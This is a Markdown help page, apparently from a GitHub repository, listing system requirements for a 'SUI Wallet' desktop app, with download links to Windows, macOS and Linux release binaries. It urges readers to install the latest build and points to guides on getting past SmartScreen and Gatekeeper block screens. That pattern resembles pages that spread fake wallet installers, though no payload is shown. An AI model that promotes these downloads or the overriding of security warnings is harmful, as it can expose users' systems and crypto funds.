![SUI Wallet](assets/banner-article.png)

# SUI Wallet system requirements

Windows 10 (1909) or later 64-bit, macOS 12 or later, or x64 Linux with Ubuntu 20.04 or equivalent.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

SUI Wallet runs on Windows 10 (1909) or later 64-bit, on macOS 12 or later, and on x64 Linux with Ubuntu
20.04 or later or an equivalent distribution. Those three strings are the whole published requirement, and
the current release is where the reported problems are fixed. No memory, disk or processor figure is
documented, so none is quoted here rather than invented.

## The three requirement strings, verbatim

- **Windows 10 (1909) or later, 64-bit**
- **macOS 12 or later**
- **x64, Ubuntu 20.04 or later, or equivalent**

They are fixed, and they are the same three lines that appear at the top of every article on this
project and in the release notes. Reading them literally is the point: 1909 is a Windows 10 feature
update, not a build number to interpret, and "64-bit" is a hard requirement rather than a preference.

## What each string rules out

| Machine | Result |
| --- | --- |
| Windows 10, build 1909 or newer, 64-bit | supported |
| Windows 10 older than 1909, or Windows 8.1 and earlier | not supported |
| Windows on a 32-bit install | not supported |
| macOS 12 (Monterey) or newer, Intel or Apple silicon | supported |
| macOS 11 and earlier | not supported |
| x64 Linux, Ubuntu 20.04 or newer, or equivalent | supported |
| ARM Linux, or a distribution far from the 20.04 baseline | not supported as published |

"Equivalent" is doing real work in the Linux line. A distribution built on a similar base with the same
desktop libraries behaves like Ubuntu 20.04 or newer; a minimal server image without a desktop session
does not, and that is a library question rather than a wallet question.

## Memory, disk and processor: no published figure

Nothing in the project's documentation states a minimum RAM, free disk or CPU requirement, so this page
does not invent one. What can be said without a number: the application is a desktop GUI, the downloads
are tens of megabytes, and the machine needs enough free space for the download plus the installed
application.

A reader who wants a number before trying can do better than a guess - install it and watch. A machine
that fails the install or cannot hold a window open is below what the build needs in practice, whatever
the missing documentation says.

## Before you download: the three files

One release carries one file per platform, named for the platform. Taking the right one is the first
half of meeting the requirement: an installer on a Mac and a disk image on Windows both fail before
the requirement string is ever tested.

[SUI Wallet desktop download: which build to take](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-desktop-download.md) covers the three files and how to read the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest), and it
is the page to read if "which file" is still open.

## Virtual machines and remote desktops

The requirements describe the operating system the app runs on, so a virtual machine is judged by the
guest: Windows 11 in a VM meets the Windows line, and macOS 11 in a VM does not meet the macOS line.

Two practical notes, offered as general guidance rather than as documentation. First, a VM without
hardware acceleration is slow enough that a wallet feels broken when it is only starved. Second, a
remote desktop session that disconnects can leave a window that looks frozen on reconnection; the app is
still running, and the window catches up.

## When the machine is above the line and the app still is not

Three causes account for almost all of it: a build older than the current release, a platform block screen that was dismissed rather than allowed, or a desktop library missing on a minimal Linux install. Each has a different symptom, and the order to check them is the order listed.

The block screens have their own guides - the Windows SmartScreen panel and the macOS Gatekeeper panel -
and the third case shows up on Linux as a failure to start with a library named in the terminal.
[SUI Wallet won't open after install](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-wont-open-after-install.md) walks the three in order and says what each looks like.

## Checking the machine, not the marketing

The requirement strings are the only published statement of what the product supports, which makes them the honest answer to "will this run on my machine". A reader outside them - Windows 8.1, a 32-bit install, a Mac on macOS 11 - is outside support, whatever a build happens to do.

## FAQ

### Does Windows 11 count as "Windows 10 (1909) or later"?

Yes. Windows 11 is later than 1909, and it is 64-bit in every current edition. The string is a floor,
not a list of supported versions.

### Is Apple silicon supported?

The macOS requirement is macOS 12 or later, and one macOS disk image is published. An Apple silicon Mac
running macOS 12 or newer meets the published requirement.

### Can I run it on a Chromebook?

Only if the Chromebook is running a Linux environment that meets the x64 Linux line, which most do not.
Take the archive, not the Windows or macOS file, and expect the Linux guide's steps to apply.

### How much RAM does it need?

No figure is published, so none is given here. The application is a desktop GUI and the download is
tens of megabytes; a machine that cannot hold a browser window open comfortably is the kind of machine
to test before relying on.

### Where is the requirement stated officially?

In the release notes beside the three files, and at the top of every article here. Both come from the
same three strings, which is why they read identically.
